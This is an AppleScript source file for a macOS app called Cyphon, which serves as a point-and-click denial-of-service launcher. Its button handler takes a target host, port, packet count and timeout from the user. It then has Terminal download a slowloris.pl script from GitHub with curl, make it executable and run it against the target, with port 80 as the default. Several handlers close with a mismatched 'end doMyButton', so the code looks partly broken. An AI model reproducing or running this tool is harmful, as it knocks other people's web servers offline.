--
--  AppDelegate.applescript
--  Cyphon
--
--  Created by Abilash Menon on 8/3/17.
--  Copyright © 2017 Abilash Menon. All rights reserved.
--

script AppDelegate
	property parent : class "NSObject"
    property myTextField : missing value
    property statusField : missing value
    property progressBar : missing value
    property btnStop : missing value
    property portField : missing value
    property packetField : missing value
    property timeoutField : missing value
    property btnStart : missing value
	
	-- IBOutlets
	property theWindow : missing value
	
	on applicationWillFinishLaunching_(aNotification)
        btnStop's setHidden_(1)
		-- Insert code here to initialize your application before any files are opened 
	end applicationWillFinishLaunching_
	
	on applicationShouldTerminate_(sender)
		-- Insert code here to do any housekeeping before your application quits 
		return current application's NSTerminateNow
	end applicationShouldTerminate_
    
    on myButtonHandler_(sender)
          set textFieldValue to myTextField's stringValue()
            set portFieldValue to portField's stringValue()
              set packetFieldValue to packetField's stringValue()
                set timeoutFieldValue to timeoutField's stringValue()
        if (textFieldValue's |length|() is not 0) and (portFieldValue's |length|() is not 0) and (packetFieldValue's |length|() is not 0) and (timeoutFieldValue's |length|() is not 0)  then
         set currentTextFieldText to myTextField's stringValue() as text
         set portFieldText to portField's stringvalue() as text
         set packetFieldText to packetField's stringvalue() as text
         set timeoutFieldText to timeoutField's stringvalue() as text
         
         display dialog "Are you sure you want to DoS " & currentTextFieldText & " in Port "& portFieldText & " with " & packetFieldText & " packets in a timeout of "& timeoutFieldText & " seconds ? " with title "Cyphon" with icon 0
        tell application "Terminal"
            activate
        do script "mkdir -p ~/Source && cd ~/Source/"
            do script "curl -O https://raw.githubusercontent.com/abila5h/Cyphon-DoS/master/slowloris.pl" in window 1
            do script "chmod +x slowloris.pl" in window 1
            do script "./slowloris.pl -dns  " & currentTextFieldText & " -port "  & portFieldText &  " -timeout " &timeoutFieldText & " -num "& packetFieldText in window 1
            set current settings of first tab of first window to settings set "Homebrew"
        end tell
statusField's setStringValue_("DoS in Progress")
progressBar's startAnimation_(me)
  btnStart's setHidden_(1)
    btnStop's setHidden_(0)
  

    else
    display dialog "Please enter valid values before you begin the DoS" with title "Cyphon" with icon 0
    
  end if
      end doMyButton
    
    on btnStop_(sender)
        tell application "Terminal"
            quit
        end tell
        myTextField's setStringValue_("")
        statusField's setStringValue_("")
        portField's setStringValue_("")
        packetField's setStringValue_("")
        timeoutField's setStringValue_("")
        progressBar's stopAnimation_(me)
        btnStop's setHidden_(1)
          btnStart's setHidden_(0)

end doMyButton
    
    on btnDefault_(sender)
        portField's setStringValue_("80")
        packetField's setStringValue_("1000")
        timeoutField's setStringValue_("5")

                end doMyButton

end script
